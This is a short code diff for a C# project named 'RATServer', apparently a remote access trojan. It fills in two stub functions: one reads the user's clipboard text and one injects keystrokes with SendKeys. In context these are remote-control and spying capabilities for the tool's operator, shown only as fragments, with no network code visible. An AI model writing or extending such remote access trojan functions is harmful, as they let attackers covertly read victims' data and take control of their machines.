@@ -6,6 +6,7 @@ using System.Linq;
 using System.Net;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace RATServer
 {
@@ -53,12 +54,11 @@ namespace RATServer
         }
         public static string ClipBoard()
         {
-            string x = ""; //get clipboard
-            return x;
+            return Clipboard.GetText();
         }
-        public static void KeyPress()
+        public static void KeyPress(string Keys)
         {
-            //press keys
+            SendKeys.Send(Keys);
         }
     }
 }
